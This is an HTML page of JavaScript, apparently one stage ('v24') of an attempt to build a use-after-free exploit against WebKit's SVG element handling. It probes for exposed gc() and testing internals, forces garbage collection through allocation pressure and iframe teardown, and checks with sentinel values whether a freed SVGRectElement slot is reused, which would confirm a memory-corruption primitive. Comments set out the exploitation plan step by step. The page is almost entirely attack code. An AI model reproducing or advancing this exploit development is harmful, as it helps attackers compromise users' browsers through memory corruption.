<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v24</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
h2{color:#ff4141;font-size:11px;letter-spacing:2px;text-transform:uppercase}
.sub{color:#555;font-size:10px;margin-bottom:8px}
#controls{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
button{background:#111;border:1px solid #333;color:#00ff41;padding:5px 12px;cursor:pointer;font-family:monospace;font-size:10px}
button:hover:not(:disabled){border-color:#00ff41}
button:disabled{opacity:.3}
#log{font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-top:6px}
.ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.dim{color:#444}.sep{color:#222}
</style>
</head>
<body>
<h2>SVG UAF v24 - true GC: never-appended + iframe nuke + gc() probe</h2>
<div class="sub">v23: WeakRef alive after 20 rounds = DOM style system pins JSCell. v24: skip DOM insertion entirely, iframe teardown, gc() probe.</div>
<svg id="livesvg" width="1" height="1" style="position:fixed;opacity:0;pointer-events:none"></svg>
<div id="controls">
  <button onclick="runGCP()">GCP gc-probe</button>
  <button onclick="runNAP()">NAP never-appended</button>
  <button onclick="runIFR()">IFR iframe-nuke</button>
  <button onclick="runIFW()">IFW iframe-weakref</button>
  <button onclick="runCOR()">COR corrupt-chain</button>
  <button onclick="runAll()">RUN ALL</button>
  <button onclick="copyLog()">COPY</button>
  <button onclick="clearLog()">CLR</button>
</div>
<div id="log"></div>
<script>
var SVG_NS = 'http://www.w3.org/2000/svg';
var Lel = document.getElementById('log');
var livesvg = document.getElementById('livesvg');

function log(m, c) {
  var s = document.createElement('span');
  if (c) s.className = c;
  s.textContent = m + '\n';
  Lel.appendChild(s);
  Lel.scrollTop = Lel.scrollHeight;
}
function sep() { log('----------------------------------------------------', 'sep'); }
function raf() { return new Promise(function(r){ requestAnimationFrame(r); }); }
function micro() { return new Promise(function(r){ queueMicrotask(r); }); }
function wait(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }
function copyLog() {
  try { navigator.clipboard.writeText(Lel.innerText); } catch(e) {
    var a = document.createElement('textarea');
    a.value = Lel.innerText;
    document.body.appendChild(a); a.select();
    document.execCommand('copy'); a.remove();
  }
}
function clearLog() { Lel.innerHTML = ''; }
function dis(d) {
  var btns = document.querySelectorAll('button');
  for (var i = 0; i < btns.length; i++) {
    var fn = btns[i].getAttribute('onclick') || '';
    if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1) btns[i].disabled = d;
  }
}
window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };

function gcPressure(n) {
  var arr = [];
  n = n || 1000;
  for (var i = 0; i < n; i++) arr.push(new ArrayBuffer(4096));
  arr = null;
}

/*
 * v23 diagnosis:
 *   WeakRef.deref() = [alive] for all 20 rounds even with A=null, bv_A=null
 *   => WebKit DOM style system keeps a C++ GC root on A's JSCell* after appendChild+remove
 *   => JSC sees that root and refuses to collect A's wrapper
 *   => We can never free A's C++ SVGRectElement as long as that root lives
 *
 * ROOT CAUSE CHAIN:
 *   livesvg.appendChild(A) -> WebKit StyleResolver / MutationObserver queue
 *                             creates a C++ JSCell* root for A
 *   A.remove() -> removes from render tree, GC root may persist
 *   A = null, bv_A = null -> no JS refs, but C++ root still pins JSCell
 *   WeakRef sees C++ root -> alive forever
 *
 * v24 ANGLES:
 *
 * ANGLE 1: GCP - probe for gc() function
 *   JSC exposes gc() in debug/internal builds.
 *   Some WebKit versions leak it to web content via special flags.
 *   Also check: globalThis.gc, window.gc, GCController.collect
 *
 * ANGLE 2: NAP - never-appended elements
 *   Create A with createElementNS but NEVER call appendChild.
 *   No DOM insertion = no StyleResolver pin = no C++ GC root.
 *   Ref chain is ONLY: bv_A(JS) -> SVGAnimatedLength(C++) -> SVGRectElement(C++)
 *   If we null bv_A FIRST then null A:
 *     - SVGAnimatedLength loses JS ref -> C++ SVGAnimatedLength freed
 *     - SVGRectElement loses m_contextElement holder
 *     - WeakRef(A) should die
 *   BUT: SVGAnimatedLength C++ holds strong ref to SVGRectElement via m_contextElement
 *        So we need BOTH A AND bv_A to be null for C++ chain to break
 *   Test: null bv_A first, then null A, check WeakRef
 *
 * ANGLE 3: IFR - iframe nuke
 *   Create iframe, create A inside iframe's document
 *   Navigate iframe to about:blank -> tears down iframe JSC context
 *   Forces GC on iframe's entire heap
 *   All iframe elements freed
 *   Alloc B in main frame immediately after navigation
 *   But: A was in iframe's heap, B is in main frame's IsoHeap
 *        Different allocators! So this won't give us slot reuse.
 *   HOWEVER: what if we alloc B INSIDE iframe BEFORE navigation,
 *   then navigate? Both A and B were in iframe's heap...
 *   Actually we want: alloc B in MAIN frame, but A's slot is in IFRAME.
 *   These are different processes/heaps - won't work for slot reuse.
 *   BUT: iframe can tell us if GC fires at all -> use FinalizationRegistry inside iframe
 *   The key value: does iframe navigation trigger GC and finalizers?
 *
 * ANGLE 4: IFW - iframe with WeakRef
 *   Create A inside iframe, take WeakRef(A) inside iframe
 *   Navigate iframe -> check if WeakRef dies
 *   If yes: iframe navigation IS a GC trigger
 *   Then: create A in main frame, use same-iframe trick to trigger GC in main frame
 *   Actually: we want to force GC in MAIN frame where our A is
 *
 * REAL PLAN for corruption:
 *   If NAP (never-appended) means WeakRef dies ->
 *   We can grab bv_A from a never-appended element
 *   Write sentinel via bv_A
 *   null bv_A, null A
 *   GC pressure -> WeakRef dies
 *   Alloc B (also never-appended) -> lands in A's slot
 *   Read B's uninitialized fields -> sentinel should be there
 *
 * But wait: we confirmed in v18/v19 that bv_A.value = 31337 works on
 *           APPENDED elements. Does it work on never-appended elements?
 *           SVGAnimatedLength.baseVal should exist for any SVGElement, not just appended.
 *           Let's test.
 */

// GCP: probe for gc() exposure
async function runGCP(q) {
  if (!q) { dis(true); sep(); log('GCP: probe for exposed gc() / GCController', 'inf'); sep(); }

  var gcFns = ['gc', 'GCController', 'collectGarbage', 'go', 'freeMemory'];
  var found = [];
  for (var i = 0; i < gcFns.length; i++) {
    var name = gcFns[i];
    var val = null;
    try { val = typeof window[name]; } catch(e) {}
    log('  window.' + name + ' = ' + val, val !== 'undefined' ? 'bad' : 'dim');
    if (val !== 'undefined') found.push(name);
  }

  // Try calling gc() if it exists
  var gcCallable = false;
  if (found.indexOf('gc') !== -1) {
    try {
      gc();
      gcCallable = true;
      log('  gc() called successfully!', 'bad');
    } catch(e) {
      log('  gc() exists but threw: ' + e, 'inf');
    }
  }

  // Probe webkit-specific internals
  var internals = ['internals', 'testRunner', 'layoutTestController', 'window.internals'];
  for (var j = 0; j < internals.length; j++) {
    var n = internals[j];
    var v = null;
    try { v = typeof window[n]; } catch(e2) {}
    if (v !== 'undefined') {
      log('  [!!] ' + n + ' exposed! type=' + v, 'bad');
      found.push(n);
    }
  }

  log('[*] GCP: gcExposed=' + (found.length > 0) + ' gcCallable=' + gcCallable, found.length > 0 ? 'bad' : 'inf');
  if (!q) dis(false);
  return { gcExposed: found.length > 0, gcCallable: gcCallable, found: found };
}

// NAP: never-appended elements - skip DOM insertion to avoid style system pin
async function runNAP(q) {
  if (!q) { dis(true); sep(); log('NAP: never-appended element - no style system pin', 'inf'); sep(); }

  log('[*] test 1: can we grab bv_A from never-appended element?', 'ok');

  // Create A but NEVER append to DOM
  var A_det = document.createElementNS(SVG_NS, 'rect');
  A_det.setAttribute('width', '80');
  A_det.setAttribute('height', '60');
  // DO NOT: livesvg.appendChild(A_det)

  var bv_det = null;
  var det_w = null;
  try {
    bv_det = A_det.width ? A_det.width.baseVal : null;
    det_w = bv_det ? bv_det.value : null;
  } catch(e) {
    log('  [!] bv_A on detached element threw: ' + e, 'bad');
  }
  log('  A_det.width.baseVal.value = ' + det_w + ' (expect 80)', det_w === 80 ? 'ok' : 'bad');

  // Write to detached element
  var write_ok = false;
  try {
    if (bv_det) { bv_det.value = 31337; }
    var rb = bv_det ? bv_det.value : null;
    write_ok = (rb === 31337);
    log('  write 31337 to detached bv_A, readback=' + rb, write_ok ? 'ok' : 'bad');
  } catch(e) {
    log('  write to detached bv_A threw: ' + e, 'bad');
  }

  log('');
  log('[*] test 2: WeakRef on never-appended A after null bv_A + null A', 'ok');

  var weakA = null;
  var A2 = null;
  var bv_A2 = null;
  try {
    A2 = document.createElementNS(SVG_NS, 'rect');
    A2.setAttribute('width', '80');
    // NO appendChild
    bv_A2 = A2.width ? A2.width.baseVal : null;
    weakA = new WeakRef(A2);
    log('  A2 created (never-appended), weakRef registered', 'ok');
  } catch(e) {
    log('  setup threw: ' + e, 'bad');
  }

  // Drop bv_A2 first (breaks SVGAnimatedLength strong ref chain)
  bv_A2 = null;
  // Drop A2 (no more JS refs)
  A2 = null;

  log('  bv_A2=null, A2=null - all refs dropped', 'ok');

  var collected = false;
  for (var round = 0; round < 30; round++) {
    gcPressure(1500);
    await micro();
    gcPressure(1500);
    await raf();
    await wait(30);

    var alive = weakA ? weakA.deref() : null;
    var status = alive ? '[alive]' : 'undefined';
    log('  round=' + round + ': weakRef=' + status, alive ? 'dim' : 'bad');

    if (!alive) {
      collected = true;
      log('  [!!] COLLECTED: A2 JS wrapper GC\'d after never-append + all-null', 'bad');
      log('  [!!] no DOM insertion = no style system pin = GC works!', 'bad');
      break;
    }
  }

  if (!collected) {
    log('  still alive after 30 rounds - even never-appended elements pinned?', 'inf');
    log('  [*] bv_A may still hold C++ strong ref even after bv_A=null', 'inf');
    log('  [*] SVGAnimatedLength may intern itself into element\'s attr map', 'inf');
  }

  log('[*] NAP: detachedBvWorks=' + write_ok + ' gcCollected=' + collected, 'inf');
  if (!q) dis(false);
  return { detachedBvWorks: write_ok, gcCollected: collected };
}

// IFR: iframe nuke - test if iframe navigation triggers GC
async function runIFR(q) {
  if (!q) { dis(true); sep(); log('IFR: iframe nuke - does navigation trigger GC?', 'inf'); sep(); }

  // Create iframe
  var iframe = document.createElement('iframe');
  iframe.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px';
  iframe.src = 'about:blank';
  document.body.appendChild(iframe);
  await wait(100);

  var iframeWin = iframe.contentWindow;
  var iframeDoc = iframe.contentDocument;

  if (!iframeDoc) {
    log('  [!] iframe not accessible', 'bad');
    iframe.remove();
    if (!q) dis(false);
    return { finFired: false };
  }

  log('  iframe created, injecting SVG element + FinalizationRegistry...', 'ok');

  // Inject code into iframe to create A with FinalizationRegistry
  var finFired = false;
  var iframeSVG_NS = 'http://www.w3.org/2000/svg';

  // Create SVG element in iframe
  var iSvg = iframeDoc.createElementNS(iframeSVG_NS, 'svg');
  iSvg.setAttribute('width', '10');
  iSvg.setAttribute('height', '10');
  iframeDoc.body.appendChild(iSvg);

  var iA = iframeDoc.createElementNS(iframeSVG_NS, 'rect');
  iA.setAttribute('width', '80');
  iA.setAttribute('height', '80');
  iSvg.appendChild(iA);

  // Set up FinalizationRegistry inside iframe's JS context
  var iReg = null;
  try {
    iReg = new iframeWin.FinalizationRegistry(function(token) {
      finFired = true;
      log('  [!!] IFRAME FINALIZER FIRED: token=' + token, 'bad');
      log('  [!!] iframe navigation IS a GC trigger!', 'bad');
    });
    iReg.register(iA, 'iA-token');
    log('  FinalizationRegistry registered for iA', 'ok');
  } catch(e) {
    log('  FinalizationRegistry in iframe threw: ' + e, 'bad');
  }

  // Also try WeakRef in iframe
  var iWeakA = null;
  try {
    iWeakA = new iframeWin.WeakRef(iA);
  } catch(e) {}

  // Drop iframe refs
  iA = null;
  iSvg = null;
  iReg = null;

  log('  all iframe refs dropped, navigating iframe...', 'ok');

  // Navigate iframe - this should tear down the JS context
  await new Promise(function(resolve) {
    iframe.onload = resolve;
    iframe.src = 'about:blank?v=2'; // different URL to force reload
    setTimeout(resolve, 500); // fallback
  });

  log('  iframe navigated', 'ok');

  // Give finalizers time to run
  for (var round = 0; round < 5; round++) {
    gcPressure(500);
    await micro();
    await raf();
    await wait(100);
    log('  post-nav round=' + round + ' finFired=' + finFired, finFired ? 'bad' : 'dim');
    if (finFired) break;
  }

  // Check WeakRef (may be invalid now since iframe context is gone)
  var iWeakStatus = '?';
  try {
    iWeakStatus = iWeakA ? (iWeakA.deref() ? '[alive]' : 'undefined') : 'no-weakref';
  } catch(e) {
    iWeakStatus = 'threw:' + e.message;
  }
  log('  iWeakRef after nav: ' + iWeakStatus, 'inf');

  iframe.remove();

  log('[*] IFR: finFired=' + finFired, finFired ? 'bad' : 'inf');
  if (!q) dis(false);
  return { finFired: finFired };
}

// IFW: iframe WeakRef approach - alloc A in iframe, detect death, alloc B in main frame
async function runIFW(q) {
  if (!q) { dis(true); sep(); log('IFW: iframe WeakRef - A in iframe, B in main frame at iframe death', 'inf'); sep(); }

  log('[*] theory: iframe death forces GC on iframe heap, B alloc in main frame', 'ok');
  log('[*] problem: A and B in different heap contexts - reuse unlikely', 'ok');
  log('[*] BUT: WebKit may use single process IsoHeap shared across frames', 'ok');
  log('[*] test: alloc A in iframe, nav iframe, alloc B in main - check sentinel', 'ok');
  log('');

  var SENTINEL = 98765.0;

  var iframe = document.createElement('iframe');
  iframe.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px';
  iframe.src = 'about:blank';
  document.body.appendChild(iframe);
  await wait(100);

  var iframeDoc = iframe.contentDocument;
  if (!iframeDoc) {
    log('  iframe not accessible', 'bad');
    iframe.remove();
    if (!q) dis(false);
    return { reused: false };
  }

  var iframeSVG_NS = 'http://www.w3.org/2000/svg';
  var iSvg = iframeDoc.createElementNS(iframeSVG_NS, 'svg');
  iSvg.setAttribute('width', '10');
  iSvg.setAttribute('height', '10');
  iframeDoc.body.appendChild(iSvg);

  var iA = iframeDoc.createElementNS(iframeSVG_NS, 'rect');
  iA.setAttribute('width', '80');
  iSvg.appendChild(iA);
  await raf();

  // Write sentinel into iA's height field
  var ibv_AH = iA.height ? iA.height.baseVal : null;
  try {
    if (ibv_AH) ibv_AH.value = SENTINEL;
    var rb = ibv_AH ? ibv_AH.value : null;
    log('  iA created in iframe, SENTINEL=' + rb + ' written to iA.height', rb === SENTINEL ? 'ok' : 'bad');
  } catch(e) {
    log('  sentinel write threw: ' + e, 'bad');
  }

  // Drop all refs
  iA = null; iSvg = null; ibv_AH = null;

  // Navigate iframe to free A
  await new Promise(function(resolve) {
    iframe.onload = resolve;
    iframe.src = 'about:blank?v=3';
    setTimeout(resolve, 300);
  });

  await raf();
  gcPressure(2000);
  await micro();
  gcPressure(2000);
  await raf();

  // Alloc B in MAIN frame immediately
  var B = document.createElementNS(SVG_NS, 'rect');
  B.setAttribute('width', '55');
  // don't set height
  livesvg.appendChild(B);
  await micro();

  var bv_BH = B.height ? B.height.baseVal : null;
  var B_h = null;
  try { B_h = bv_BH ? bv_BH.value : null; } catch(e) {}
  log('  B allocd in main frame: B.height=' + B_h + ' (sentinel=' + SENTINEL + ')', B_h === SENTINEL ? 'bad' : 'dim');

  var reused = (B_h === SENTINEL);
  if (reused) {
    log('  [!!] CROSS-FRAME REUSE: iframe A slot = main frame B slot!', 'bad');
    log('  [!!] WebKit uses shared IsoHeap across frames', 'bad');
  }

  B.remove();
  iframe.remove();

  log('[*] IFW: reused=' + reused, reused ? 'bad' : 'inf');
  if (!q) dis(false);
  return { reused: reused };
}

// COR: full corruption chain - try all methods for genuine slot reuse
async function runCOR(q) {
  if (!q) { dis(true); sep(); log('COR: full corruption - NAP then sentinel confirm', 'inf'); sep(); }

  var SENTINEL = 98765.0;
  var reused = false;

  // Strategy: never-appended A, write sentinel via bv_A,
  // null bv_A (break SVGAnimatedLength C++ strong ref),
  // null A (no more JS refs to SVGRectElement),
  // GC pressure, alloc B never-appended with only width set,
  // read B.height - if SENTINEL then slot reused

  for (var attempt = 0; attempt < 15 && !reused; attempt++) {
    // Clear any lingering elements
    while (livesvg.firstChild) livesvg.removeChild(livesvg.firstChild);
    await raf();

    // Create A - NEVER appended
    var A = document.createElementNS(SVG_NS, 'rect');
    A.setAttribute('width', '80');
    A.setAttribute('height', '60');
    A.setAttribute('rx', '12');
    // NO appendChild

    var bv_AH = null;
    var bv_ARX = null;
    var bv_AX = null;
    try {
      bv_AH  = A.height ? A.height.baseVal : null;
      bv_ARX = A.rx     ? A.rx.baseVal     : null;
      bv_AX  = A.x      ? A.x.baseVal      : null;
    } catch(e) {}

    // Write sentinels into A's fields
    var s_ok = false;
    try {
      if (bv_AH)  bv_AH.value  = SENTINEL;
      if (bv_ARX) bv_ARX.value = SENTINEL + 1;
      if (bv_AX)  bv_AX.value  = SENTINEL + 2;
      var rb_h  = bv_AH  ? bv_AH.value  : null;
      var rb_rx = bv_ARX ? bv_ARX.value : null;
      s_ok = (rb_h === SENTINEL);
    } catch(e) {}

    if (attempt === 0) {
      log('  sentinel writes to never-appended A: ok=' + s_ok, s_ok ? 'ok' : 'bad');
      if (!s_ok) {
        log('  [!] cant write to never-appended elements - different code path', 'bad');
        break;
      }
    }

    // Drop ALL refs - bv first to break C++ chain, then A
    bv_AH = null; bv_ARX = null; bv_AX = null;
    A = null;

    // Scale up GC pressure by attempt
    var rounds = 2 + Math.floor(attempt / 3);
    for (var r = 0; r < rounds; r++) {
      gcPressure(2000);
      await micro();
      gcPressure(2000);
      await raf();
      await wait(20 + attempt * 10);
    }

    // Alloc B - NEVER appended, width only
    var B = document.createElementNS(SVG_NS, 'rect');
    B.setAttribute('width', '55');
    // NO height, rx, x set
    // Also don't append

    var bv_BH  = null;
    var bv_BRX = null;
    var bv_BX  = null;
    var B_h = null, B_rx = null, B_x = null;
    try {
      bv_BH  = B.height ? B.height.baseVal : null;
      bv_BRX = B.rx     ? B.rx.baseVal     : null;
      bv_BX  = B.x      ? B.x.baseVal      : null;
      B_h  = bv_BH  ? bv_BH.value  : null;
      B_rx = bv_BRX ? bv_BRX.value : null;
      B_x  = bv_BX  ? bv_BX.value  : null;
    } catch(e) {}

    var hit = (B_h === SENTINEL || B_rx === SENTINEL + 1 || B_x === SENTINEL + 2);
    log('  attempt=' + attempt + ': B_h=' + B_h + ' B_rx=' + B_rx + ' B_x=' + B_x + ' hit=' + hit,
        hit ? 'bad' : 'dim');

    if (hit) {
      reused = true;
      var which = B_h === SENTINEL ? 'height' : B_rx === SENTINEL+1 ? 'rx' : 'x';
      log('  [!!] SENTINEL SURVIVED INTO B: field=' + which, 'bad');
      log('  [!!] B is in A\'s freed IsoHeap slot!', 'bad');
      log('  [!!] UAF primitive: write via bv_A, read via B\'s attrs = confirmed!', 'bad');
    }

    // cleanup
    bv_BH = null; bv_BRX = null; bv_BX = null;
    B = null;
    await raf();
  }

  log('[*] COR: reused=' + reused, reused ? 'bad' : 'inf');
  if (!reused) {
    log('[*] even never-appended elements keep JSCell* pinned', 'inf');
    log('[*] next: need explicit vm.gc() or different strategy', 'inf');
  }
  if (!q) dis(false);
  return { reused: reused };
}

// RUN ALL
async function runAll() {
  dis(true); clearLog(); sep();
  log('SVG UAF v24 - gc probe, never-appended, iframe nuke, corruption chain', 'inf');
  sep();

  var results = {};
  var tests = [
    ['GCP_gc_probe',    runGCP],
    ['NAP_never_appnd', runNAP],
    ['IFR_iframe_nuke', runIFR],
    ['IFW_iframe_weak', runIFW],
    ['COR_corrupt',     runCOR]
  ];

  for (var i = 0; i < tests.length; i++) {
    var lbl = tests[i][0];
    var fn  = tests[i][1];
    sep();
    log(lbl, 'inf');
    sep();
    try { results[lbl] = await fn(true); }
    catch(e) { log('[!] ' + lbl + ': ' + e, 'bad'); results[lbl] = null; }
    log('');
  }

  sep();
  log('SUMMARY v24', 'inf');
  sep();
  var keys = Object.keys(results);
  for (var ki = 0; ki < keys.length; ki++) {
    var k = keys[ki];
    var r = results[k];
    if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }

    var v;
    if (r.gcCallable  !== undefined) v = r.gcCallable;
    else if (r.gcCollected  !== undefined) v = r.gcCollected;
    else if (r.finFired     !== undefined) v = r.finFired;
    else if (r.reused       !== undefined) v = r.reused;
    else v = '?';

    log('  ' + k + ': key=' + v, v === true ? 'bad' : 'dim');
  }
  sep();
  dis(false);
}
